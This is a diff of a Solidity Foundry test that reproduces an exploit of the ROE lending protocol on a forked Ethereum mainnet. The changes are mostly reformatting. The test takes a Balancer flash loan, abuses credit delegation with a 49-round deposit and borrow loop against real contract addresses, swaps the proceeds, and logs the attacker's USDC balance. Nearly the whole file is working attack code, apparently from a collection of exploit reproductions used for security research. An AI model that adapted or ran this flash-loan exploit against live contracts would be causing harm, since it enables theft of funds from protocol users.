@@ -11,14 +11,20 @@ import "./interface.sol";
 
 interface ROE {
     function deposit(address asset, uint256 amount, address onBehalfOf, uint16 referralCode) external;
-    function borrow(address asset, uint256 amount, uint256 interestRateMode, uint16 referralCode, address onBehalfOf) external;
+    function borrow(
+        address asset,
+        uint256 amount,
+        uint256 interestRateMode,
+        uint16 referralCode,
+        address onBehalfOf
+    ) external;
 }
 
 interface vdWBTC_USDC_LP {
     function approveDelegation(address delegatee, uint256 amount) external;
 }
 
-contract ContractTest is DSTest{
+contract ContractTest is DSTest {
     IBalancerVault balancer = IBalancerVault(0xBA12222222228d8Ba445958a75a0704d566BF2C8);
     ROE roe = ROE(0x5F360c6b7B25DfBfA4F10039ea0F7ecfB9B02E60);
     Uni_Pair_V2 Pair = Uni_Pair_V2(0x004375Dff511095CC5A197A54140a24eFEF3A416);
@@ -29,12 +35,12 @@ contract ContractTest is DSTest{
     IERC20 roeUSDC = IERC20(0x9C435589f24257b19219ba1563e3c0D8699F27E9);
     IERC20 vdUSDC = IERC20(0x26cd328E7C96c53BD6CAA6067e08d792aCd92e4E);
     address roeWBTC_USDC_LP = 0x68B26dCF21180D2A8DE5A303F8cC5b14c8d99c4c;
-    uint flashLoanAmount = 5_673_090_338_021;
+    uint256 flashLoanAmount = 5_673_090_338_021;
 
     CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
 
     function setUp() public {
-        cheats.createSelectFork("mainnet", 16384469); 
+        cheats.createSelectFork("mainnet", 16_384_469);
         cheats.label(address(roe), "ROE");
         cheats.label(address(USDC), "USDC");
         cheats.label(address(WBTC), "WBTC");
@@ -43,25 +49,32 @@ contract ContractTest is DSTest{
 
     function testExploit() external {
         cheats.startPrank(address(tx.origin));
-        LP.approveDelegation(address(this), type(uint).max);
+        LP.approveDelegation(address(this), type(uint256).max);
         cheats.stopPrank();
-        address [] memory tokens = new address[](1);
+        address[] memory tokens = new address[](1);
         tokens[0] = address(USDC);
-        uint256 [] memory amounts = new uint256[](1);
+        uint256[] memory amounts = new uint256[](1);
         amounts[0] = flashLoanAmount;
         bytes memory userData = "";
         balancer.flashLoan(address(this), tokens, amounts, userData);
 
-        emit log_named_decimal_uint("Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals());
+        emit log_named_decimal_uint(
+            "Attacker USDC balance after exploit", USDC.balanceOf(address(this)), USDC.decimals()
+        );
     }
 
-    function receiveFlashLoan(address[] memory tokens, uint256[] memory amounts, uint256[] memory feeAmounts, bytes memory userData) external {
-        uint borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
-        USDC.approve(address(roe), type(uint).max);
-        Pair.approve(address(roe), type(uint).max);
+    function receiveFlashLoan(
+        address[] memory tokens,
+        uint256[] memory amounts,
+        uint256[] memory feeAmounts,
+        bytes memory userData
+    ) external {
+        uint256 borrowAmount = Pair.balanceOf(roeWBTC_USDC_LP);
+        USDC.approve(address(roe), type(uint256).max);
+        Pair.approve(address(roe), type(uint256).max);
         roe.deposit(address(USDC), USDC.balanceOf(address(this)), tx.origin, 0);
         roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
-        for(uint i; i < 49; ++i){
+        for (uint256 i; i < 49; ++i) {
             roe.deposit(address(Pair), borrowAmount, address(this), 0);
             roe.borrow(address(Pair), borrowAmount, 2, 0, tx.origin);
         }
@@ -75,17 +88,12 @@ contract ContractTest is DSTest{
     }
 
     function WBTCToUSDC() internal {
-        WBTC.approve(address(Router), type(uint).max);
-        address [] memory path = new address[](2);
+        WBTC.approve(address(Router), type(uint256).max);
+        address[] memory path = new address[](2);
         path[0] = address(WBTC);
         path[1] = address(USDC);
         Router.swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            WBTC.balanceOf(address(this)),
-            0,
-            path,
-            address(this),
-            block.timestamp
+            WBTC.balanceOf(address(this)), 0, path, address(this), block.timestamp
         );
     }
 }
-
